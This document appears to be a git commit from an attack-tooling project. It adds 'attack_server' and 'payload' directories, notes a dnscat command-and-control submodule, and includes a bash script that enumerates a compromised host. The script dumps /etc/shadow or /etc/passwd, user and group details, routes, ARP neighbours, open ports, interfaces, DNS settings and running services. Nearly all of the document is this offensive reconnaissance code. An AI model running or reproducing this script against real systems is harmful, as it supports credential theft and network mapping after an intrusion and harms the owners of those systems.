9c6fa2aa598e2f797de7dc543f7f22d8bdfefb9f
JC <JC@evil.com>
2021-04-20 17:16:55 -0400

    Added directores for server (attack_server)  and payload (payload) Added submodule for dnscat to server Added host enumeration scrip to payload

---
+++ payload/configHost_aka_StaticEnum.sh
@@ -0,0 +1,17 @@
+#/bin/bash
+
+echo {Host Info:
+pwd 
+whoami
+users
+groups
+echo {ETC: $(cat /etc/shadow /dev/null || cat /etc/passwd)}
+echo }
+echo {Networking Info:
+echo {Routes: $(ip route || route)}, 
+echo {Neighbors: $(ip neigh || arp)},
+echo {DNS cache: $(cat /etc/hosts)},
+echo {Ports: $(netstat --ip -a)},
+echo {Interfaces: $(ip add || ifconfig)},
+echo {DNS: $(cat /etc/resolv.conf)}}
+echo {Services: $(service --status-all)}}
